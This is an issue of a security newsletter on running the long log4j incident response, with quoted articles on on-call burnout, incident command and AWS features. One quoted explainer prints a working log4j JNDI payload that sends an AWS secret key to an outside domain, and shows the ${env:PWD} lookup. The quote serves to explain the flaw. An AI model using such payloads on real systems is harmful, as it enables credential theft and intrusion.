---
title: "179 - Managing a wide ranging and long running incident"
date: 2022-01-09
description: "Happy new year!"
permalink: /managing-a-wide-ranging-and-long-running-incident/
---

Happy new year!

I said last year that I'd take a break for Christmas, and then a fairly major incident broke, and I spent a number of hours writing [the longest cyberweekly newsletter that I've ever written](https://www.cyberweekly.net/solarwinds-special).  This year, I said I'd take a break, and then a major incident broke!  This time I decided that there was more than enough information out there, and I decided not to add to the noise.  I don't know if that was welcome or not, but it certainly made my life easier not to have to scrabble to pull this together!

What struck me with this one was that it was pretty clear very early on that this was going to be a long running incident.  The news and landscape was constantly changing, and due to the nature of log4j as software, it was clear that the impact might be found almost anywhere in a system stack.  Firewalls, vmware virtualisation systems and VPN appliances were found to be vulnerable, and this meant that almost anything that used electricity was impacted.  "Java, write once, run everywhere" became a phrase to be cursed, as it seems it was shockingly true.

Many of you will have been thrown feet first into this, trying to coordinate getting information into an incident response team, organising internal software audits to determine what version was used anywhere, and engaging about a billion suppliers to see if you needed to patch anything there.

Many of us are not used to organising and running significant incidents. In many cases a security incident is caused by the detection of an adversary, and very quickly it becomes a job of containment and remediation.  The main incident can be over really quickly, and as such, we tend to think that the way to deal with this is by throwing lots of people at the problem and making them all work overtime.

But vulnerability incidents are different.  The main thing is about gathering information, and making constant prioritisation decisions against a ticking clock.  There was no simple fix here, if you had even a fairly small estate, you were probably looking at thousands of systems needing patching or updating, and turning systems off is a really significant business impact.  

That means needing to be able to prioritise those systems, determine things that can reduce but not prevent compromise (such as WAF detection rules), and it means constant work.

In the face of this, we need processes that enable the humans involved to sleep, to eat, to recover and to not burn out.  An incident like this can and does stretch on for weeks, and that requires an approach that can treat it like a marathon.

I hope that coming back to the new year, and probably a list of "business as usual" patches to apply as part of the "post-log4j cleanup", you are taking time to thank everyone who worked hard, you are reflecting on what went well, and considering how you can improve your incident response capability.  This certainly wont be the last time that we see a significant vulnerability in a major piece of software, so this is going to happen again to our teams in the future.

On that cheery note, happy new year.  I hope you all enjoyed a break, and I've enjoyed taking a break from this, and indeed from work for a number of weeks.  I've got around 3 or 4 newsletters worth of articles all queued up, and several hundred tabs in my "to read", so you can look forward to plenty of "2021 wrap up" posts over the next few weeks as I work my way through them all.  

## [News & Analysis | No. 311 - Daniel Miessler](https://danielmiessler.com/podcast/news-analysis-no-311/)

[https://danielmiessler.com/podcast/news-analysis-no-311/](https://danielmiessler.com/podcast/news-analysis-no-311/)

> What Happened: A 0-day exploit was released for log4j—a Java-based logging utility that’s part of the Apache Logging Services project. It is used by millions of systems worldwide to process logs. 
> 
> Impact: People are comparing this to Heartbleed, but it’s much worse in a number of ways. While Heartbleed affected all TLS implementations, and this one only affects systems that use log4j, this issue produces direct and immediate harm in the form of password/key extractions and shells.
> 
> This vulnerability will be with us for years because malicious payloads and vulnerable systems can sit dormant for any amount of time. At any moment they can come back alive and process a malicious payload that results in compromise.
> 
> How it Works: The vulnerability is due to insecure “lookup” functionality within log4j that executes user-provided content as code, also known as RCE. So if you provide the input  `${env:PWD}`, it’ll write the PWD environment variable to the log. It gets much worse from there, including the egressing of data out of the affected system and—most importantly—spawning a shell on the affected system.
> 
> Example: Here’s an example from @dildog of extracting AWS Keys and listening for incoming requests. 
> 
> ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}
> 


Daniel Miessler's newsletter is generally very good anyway, but this writeup of the log4j vulnerability, only 4 days into it, was readable, understandable and actionable.

Worth a read, along with of course, all of the other news areas that he has covered which you might find interesting.



## [The Apache Log4j vulnerabilities: A timeline | CSO Online](https://www.csoonline.com/article/3645431/the-apache-log4j-vulnerabilities-a-timeline.html)

[https://www.csoonline.com/article/3645431/the-apache-log4j-vulnerabilities-a-timeline.html](https://www.csoonline.com/article/3645431/the-apache-log4j-vulnerabilities-a-timeline.html)

> The Apache Log4j vulnerability has made global headlines since it was discovered in early December. The flaw has impacted vast numbers of organizations around the world as security teams have scrambled to mitigate the associated risks. Here is a timeline of the key events surrounding the Log4j vulnerability as they have unfolded.


This is a useful timeline for those of you, for whom December blurred into one great long incident response activity.


## [Rob Fuller on LinkedIn: #log4shell #log4j #management | 56 comments](https://www.linkedin.com/posts/mubix_log4shell-log4j-management-activity-6876536157119897600-nacC/)

[https://www.linkedin.com/posts/mubix_log4shell-log4j-management-activity-6876536157119897600-nacC/](https://www.linkedin.com/posts/mubix_log4shell-log4j-management-activity-6876536157119897600-nacC/)

> 9. If you are a pentester/bug bounty researcher/red teamer, you should NOT be using public services to exfiltrate secrets over unencrypted channels to websites that you do not control. You have no idea what they are doing with your customer's data.


In all of the log4j furor, this is one of the things that I consistently saw over and over again.  People "testing" their system by using random SaaS DNS services, such as the popular DNSlog.cn.

Now regular readers will know that I don't buy into the general view that China bad, US good mentality, but since most people haven't done any research into who runs DNSlog.cn, especially given that it's a free service, there's a real question about whether you should be using it, and what information you are giving to these SaaS providers.

The same with ransom testing programs that you get from github.  If you don't have someone qualified to read the source code and validate that it's not reporting anywhere else, then maybe you should be using a trustworthy tool, or ensuring you do have those skills?


## [In the aftermath of Log4Shell, three lessons that organisations must learn | Jetstack Blog](https://www.jetstack.io/blog/log4shell-lessons-to-learn/)

[https://www.jetstack.io/blog/log4shell-lessons-to-learn/](https://www.jetstack.io/blog/log4shell-lessons-to-learn/)

> A good example is logging: many logging frameworks provide the ability to send logs to a variety of locations: stdout, files, alerting services, URIs etc, but should your application be responsible for this? Arguably a better approach is to ensure your application sends its logs to stdout and use a log collector service (like Fluentd or Logstash) to actually route the logs to all necessary end locations.
> 
> Benefits of this approach include: less code and configuration in your application components (and therefore testing), development teams are not required to understand the logging requirements of other teams (operations, security etc) and alterations to the logging configuration won’t require the configuration of multiple components to be changed and rolled out. Clearly this approach can be applied to other cross-cutting concerns, with the same benefits being achievable.


This is a painful one for me.  I mostly agree with all the recommendations here.  But lets note that this wouldn't solve the "log4j" problem as a generalised problem.  

If everyone of your microservices sends its logs to Fluentd or logstash, then a vulnerability in Fluentd or logstash in how it parses that logline could well have similar consequences as embedding the log4j library within your application.

This exact form of vulnerability could have occured in this architecture as well.

But yes, simpler systems (be more unix 🙄), externalising your cross cutting concerns and maintaining an inventory your open source.  These will reduce the likelihood of impact, and make it far easier to detect and remediate in future. 


## [Has the firefighting stopped? The effect of COVID-19 on on-call engineers | PagerDuty](https://www.pagerduty.com/blog/has-the-firefighting-stopped-effect-covid-19-on-engineers/)

[https://www.pagerduty.com/blog/has-the-firefighting-stopped-effect-covid-19-on-engineers/](https://www.pagerduty.com/blog/has-the-firefighting-stopped-effect-covid-19-on-engineers/)

> Currently, many sectors are in the midst of what economists are calling The Great Resignation. Employers can’t afford to lose talented and skilled technical staff because they are burned out. Organizations need to actively manage incident response workloads and mature their on-call processes to promote better team health and avoid overworking their people. Here are three ways teams can take back control.
> 
> 1. Measure on-call qualitatively and quantitatively with operational analytics. Teams can measure on-call workloads by looking at the volume of interruptions and the time spent on-call. They can then combine this data with other metrics, such as time of day, severity, number of escalations, to identify those individuals most at risk of burnout and contextualize their on-call experience. PagerDuty Analytics collates data across incidents, services, and teams, and turns it into insights and recommendations to help managers understand the burden on on-call teams.
> 2. Stop getting interrupted by inactionable alerts. When responders are being bombarded with alerts, it creates a stressful environment where everything is “urgent.” Intelligent alert reduction cuts down on this noise, allowing responders to focus on the incidents that really need attention. You can tune alerts to share the right amount of information your teams want, even if that does mean allowing certain amounts of specific noise to cut through. Event Intelligence is PagerDuty’s AI-powered tool for digital operations. Its adaptive learning algorithms separate signals from noise and only alerts teams on genuine incidents that require human intervention.
> 3. Create automation sequences that can auto-remediate without human intervention. Another way of taking back control is to give responders access to self-service capabilities to resolve an issue, without needing to escalate to a subject matter expert or even to involve a human at all. Teams can document incident response processes (e.g scripts, tools, API calls, manual commands) into a runbook that can be automatically triggered to resolve an incident. Incidents are resolved in real-time, with minimal stress. Check out this eBook on Runbook Automation from PagerDuty and Rundeck to learn more.


Good tips from PagerDuty here, and some really interesting statistics from them as well about how the work from home change has affected incident response.  

One of the slightly unexpected, but probably predictable things, is that with people working more extended hours, earlier and later, it means that incidents are also happening outside those normal core hours.  As we move to more asynchronous working that enables people to work the hours that work for them, the response capabilities in the organisation are going to need to adjust to that as well.


## [Making Your On-call and Incident Management Program Stick | Rootly](https://rootly.com/blog/making-your-on-call-and-incident-management-program-stick)

[https://rootly.com/blog/making-your-on-call-and-incident-management-program-stick](https://rootly.com/blog/making-your-on-call-and-incident-management-program-stick)

> Like every initiation rite, your introduction to on-call should have two portions:
> 
> * Stage 1: Understanding and Observing the practice
> * Stage 2: Performing the practice themselves
> 
> Your goal in stage one is to reduce the fear and anxiety level around the topic. Being on call for a new system is intimidating, it’s a best practice to separate the cognitive load of learning the systems and products from that of learning the tools used to manage incidents. Because of this, it’s a best practice to have this meeting 3-4 weeks prior to what is likely to be the first on-call rotation for an engineer. At many companies, this will mean that this meeting is part of the rest of their new-hire training.
> 
> Here’s what you should cover in this training:
> 
> 1. What is an incident?
> 1. What are our levels of incident severity and what do they mean?
> 1. What is the lifecycle of an incident?
> 1. How can I learn the current status of an incident?
> 1. What is expected of the primary on-call for a team?
> 1. What is the role of the secondary on-call for a team?
> 1. What tools do we use for incident management and what is their purpose?


A great list for handling incident responder onboarding.  In particular the emphasis on reducing fear and anxiety is important.

Nobody should join an on-call rota with no clear idea about what might trigger a call, what actions they can take, and how to do the job.  Sadly for many of us, on-call response is created in response to a crises and never formalised.


## [sysadvent: Day 22 - So, You're Incident Commander, Now What?](https://sysadvent.blogspot.com/2021/12/day-22-so-youre-incident-commander-now.html)

[https://sysadvent.blogspot.com/2021/12/day-22-so-youre-incident-commander-now.html](https://sysadvent.blogspot.com/2021/12/day-22-so-youre-incident-commander-now.html)

> Once an individual identifies an incident, one or more people will respond to it. Their goal is to resolve the incident and return systems, services, or other software back to a functional state. While an incident may have a few or many responders—only one person is the incident commander. This role is not about experience, seniority, or position on an org chart; it is to ensure that progress is being made to resolve the incident. The incident commander must think about the inputs from the incident, make decisions about what to do next, and communicate with others about what is happening. The incident commander also determines when the incident is resolved based on the information they have. After the incident is over, the incident commander is also responsible for conducting a post-incident analysis and review to summarize what happened, what the team learned, and what will be done to mitigate the risk of a similar incident happening in the future.
> 
> Having a single person—the incident commander—be responsible for handling the incident, delegating responsibility to others, determining when the incident is resolved, and conducting the post-incident review is one of the most effective incident management strategies.


This was timely in advent, and a good reminder that your incident response processes need to ensure that there's clear leadership, that responsibilities are well defined, well understood and well communicated.

Incidents need not burn people out and require massive overwork and all-hours working.  Instead steady and effective management can ensure that incidents are handled with grace and decorum.


## [Comparing My Top Four Security Podcasts/Newsletters - Daniel Miessler](https://danielmiessler.com/blog/comparing-top-four-security-podcasts-newsletters/)

[https://danielmiessler.com/blog/comparing-top-four-security-podcasts-newsletters/](https://danielmiessler.com/blog/comparing-top-four-security-podcasts-newsletters/)

> One thing that jumped out at me was that Darknet Diaries had really low scores in a lot of areas I care about, but it was the only show with 10s. And it had two of them. I like this. It means it knows what it is and it leans heavily into that. Like I said, if you’re up for being entertained and educated about the world of hacking, there is simply nothing better.


Some great recommendations, I subscribe to all of these, and they would make my top 10 podcasts and newsletters easily, although of course, this newsletter doesn't get a mention!

The thing to take from this, especially around something like Darknet Diaries, is just how important it is to do one thing and do it well.  You can suck in all the other areas when someone is comparing, but if you are best in class in one specific area, someone will still find you useful.


## [AWS re:Invent Security re:Cap 2021 | ScaleSec](https://scalesec.com/blog/aws-reinvent-security-recap2021/)

[https://scalesec.com/blog/aws-reinvent-security-recap2021/](https://scalesec.com/blog/aws-reinvent-security-recap2021/)

> AWS Control Tower – Account Factory for Terraform & Region Deny and Guardrails
> AWS Control Tower has two new features that will help ensure sprawling cloud environments meet compliance and manageability goals with ease. ‘Account Factory for Terraform’ extends Control Tower’s existing landing zone deployments to Terraform modules, providing a familiar and pluggable pipeline for managing AWS environments at scale. This is a welcome addition and will be complemented by another new feature of Control Tower: data residency guardrails. Of particular interest are settings that allow a blanket lockout of access at a regional level, effectively turning off AWS in that region for managed accounts. These features strengthen the argument for an automation first approach to large environments by simplifying fine grained and regionalized control over assets deployed using Control Tower. Account Factor for Terraform and Guardrails announcements.


These are welcome improvements to AWS Control Tower.

As the sprawl of developer created systems continues, organisations need a way to make it simple, fast and easy for developers to create systems that align with organisational policies, but give the enterprise confidence that it aligns with security policies.  Control Tower is the way to do that, but limitations on what it can do mean that people don't use it.

Anything that improves the guardrails and makes it easier to use is a security win.


## [500M Avira Antivirus Users Introduced to Cryptomining – Krebs on Security](https://krebsonsecurity.com/2022/01/500m-avira-antivirus-users-introduced-to-cryptomining/)

[https://krebsonsecurity.com/2022/01/500m-avira-antivirus-users-introduced-to-cryptomining/](https://krebsonsecurity.com/2022/01/500m-avira-antivirus-users-introduced-to-cryptomining/)

> In August 2021, NortonLifeLock said it had reached an agreement to acquire Avast, another longtime free antivirus product that also claims to have around 500 million users. It remains to be seen whether Avast Crypto will be the next brilliant offering from NortonLifeLock.
> 
> As mentioned in this week’s story on Norton Crypto, I get that participation in these cryptomining schemes is voluntary, but much of that ultimately hinges on how these crypto programs are pitched and whether users really understand what they’re doing when they enable them. But what bugs me most is they will be introducing hundreds of millions of perhaps less savvy Internet users to the world of cryptocurrency, which comes with its own set of unique security and privacy challenges that require users to “level up” their personal security practices in fairly significant ways.


This is a truly terrible idea within an already terrible market.

AV software has some of the highest privileges in your system, as it's required to be able to read any file, interfere with any process and monitor and manage almost anything on the system.  AV software is frequently abused by attackers as a way of escalating their privilege and it means that it's a really difficult security choice about what software to trust and use.

I prefer built in software such as Microsoft Defender and Gatekeeper/XProtect in OSX, in part because you already have them and it's almost impossible to get rid of them, so you need to accept that compelxity and attack surface anyway.  

But even if the technical considerations of antivirus aren't included in this, it creates a new target for attackers.  Attackers might want to compromise your machine with NortonLifeLock simply to get it to mine cryptocurrency to put into their wallet instead of yours.

And of course, it remains true that mindlessly using "spare" compute cycles to create tokens is about the environmentally damaging and wasteful way of using that energy.  Computers should be idle when they are idle and aim to reduce their power usage where possible.


